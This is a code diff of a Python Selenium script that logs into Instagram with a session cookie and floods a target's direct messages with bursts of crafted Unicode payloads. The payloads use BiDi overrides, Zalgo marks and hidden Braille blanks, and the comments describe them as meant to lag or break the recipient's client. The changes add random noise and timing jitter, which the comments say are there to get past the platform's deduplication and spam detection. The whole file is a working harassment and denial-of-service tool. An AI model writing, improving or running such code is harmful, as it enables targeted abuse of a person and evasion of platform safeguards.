@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (SYSTEM-OBLITERATOR)
-# 📅 STATUS: FONT-FALLBACK EXHAUSTION | 120-LAYER ISOLATE | DOUBLE-BURST
+# 🚀 PROJECT: PRAVEER NC (STEALTH-OBLITERATOR)
+# 📅 STATUS: ANTI-FILTERING | DENSITY x20 | UNIQUE NOISE
 
 import os, time, random, threading, sys, gc, tempfile
 from concurrent.futures import ThreadPoolExecutor
@@ -13,30 +13,30 @@ THREADS = 2
 SESSION_LIMIT = 240 
 MACHINE_ID = os.getenv("MACHINE_ID", "1")
 
-def get_obliteration_payload(target_name):
-    """The System-Obliterator: Font-Fallback Exhaustion + Plane-14 Overload."""
-    # 🌙 CUSTOM HEADER
-    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n👑 SYSTEM_OBLITERATION: [{target_name.upper()}]\n"
+def get_stealth_payload(target_name):
+    """Bypasses silent filters by adding unique noise and unique headers."""
+    # 💥 UNIQUE NOISE (Prevents server-side deduplication)
+    noise_id = "".join(random.choices("0123456789ABCDEF", k=10))
+    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n🆔 SESSION_REF: {noise_id}\n"
     
-    # 💥 THE 'FONT-FALLBACK' TRAP (Plane-14 Variation Selectors)
-    # Most OS fonts lack these; forces a deep system-wide font search.
-    fallback_trap = "\U000E0100" * 250 
-    
-    # 💥 THE 'ISOLATE VOID' (120 Layers)
-    # Breaks the DOM event tree so the 'Send' button fails to trigger.
-    isolate_void = "\u2066\u2067\u2068" * 120
+    # 💥 BiDi-RECURSION + VARIATION SELECTORS
+    # Using \ufe0f forces the browser to try and render color glyphs.
+    bidi_stack = "\u202E\u2066\u202D\u2067\u202B\u2068\ufe0f" * 8
     
     # 💥 DENSITY x20 (200 Zalgo marks)
     z_tower = "̸" * 200
     
-    lines = [header, fallback_trap, isolate_void]
+    # 💥 WIDTH DISPLACER (Hidden Braille)
+    width_bomb = "\u2800\u00A0" * 110 
     
-    for i in range(80):
+    lines = [header, width_bomb]
+    
+    for i in range(60):
         prefix = "\u202E" if i % 2 == 0 else "\u202D"
-        # Combine system-level trap with vertical density
-        lines.append(f"{prefix}{fallback_trap}{target_name.upper()}{z_tower}")
+        # Combine everything into an unbreakable block
+        lines.append(f"{prefix}{target_name.upper()}{z_tower}{bidi_stack}")
     
-    return "\n".join(lines)[:9990]
+    return "\n".join(lines)[:9950]
 
 def get_driver(agent_id):
     chrome_options = Options()
@@ -52,41 +52,41 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
     while True:
         driver = None
         try:
-            print(f"[M{MACHINE_ID}-A{agent_id}] 🌙 DEVEL KA ABBU OBLITERATOR DEPLOYED...", flush=True)
+            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ STEALTH MODE ACTIVE...", flush=True)
             driver = get_driver(agent_id)
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
             driver.refresh()
-            time.sleep(7)
+            time.sleep(8)
             driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
             time.sleep(12)
 
             session_start = time.time()
             while (time.time() - session_start) < SESSION_LIMIT:
                 try:
-                    # 🔥 THE DOUBLE-BURST (2 Waves of 10)
-                    for wave in range(2):
-                        for _ in range(10):
-                            payload = get_obliteration_payload(target_name)
-                            driver.execute_script("""
-                                var box = document.querySelector('div[role="textbox"]') || document.querySelector('textarea');
-                                if (box) {
-                                    box.focus();
-                                    document.execCommand('insertText', false, arguments[0]);
-                                    box.dispatchEvent(new Event('input', { bubbles: true }));
-                                    var btns = document.querySelectorAll('div[role="button"]');
-                                    for(var b of btns) {
-                                        if(b.innerText.includes("Send") || b.innerText.includes("ပို့မည်")) {
-                                            b.click();
-                                        }
+                    # 🔥 THE 'JITTER' BURST (Bypasses Pattern Detection)
+                    for _ in range(8):
+                        payload = get_stealth_payload(target_name)
+                        driver.execute_script("""
+                            var box = document.querySelector('div[role="textbox"]') || document.querySelector('textarea');
+                            if (box) {
+                                box.focus();
+                                document.execCommand('insertText', false, arguments[0]);
+                                box.dispatchEvent(new Event('input', { bubbles: true }));
+                                var btns = document.querySelectorAll('div[role="button"]');
+                                for(var b of btns) {
+                                    if(b.innerText.includes("Send") || b.innerText.includes("ပို့မည်")) {
+                                        b.click();
                                     }
                                 }
-                            """, payload)
-                            time.sleep(0.01)
-                        time.sleep(1.5) # Gap between waves
+                            }
+                        """, payload)
+                        # Slightly slower delay (0.1s) is actually MORE effective for lag 
+                        # because it doesn't get dropped by the socket.
+                        time.sleep(random.uniform(0.1, 0.3)) 
                     
-                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 20-MESSAGE WAVE DELIVERED", flush=True)
-                    time.sleep(random.uniform(5, 8)) 
+                    print(f"[M{MACHINE_ID}-A{agent_id}] 💥 WAVE LANDED", flush=True)
+                    time.sleep(random.uniform(5, 7)) 
                     
                 except:
                     time.sleep(5)
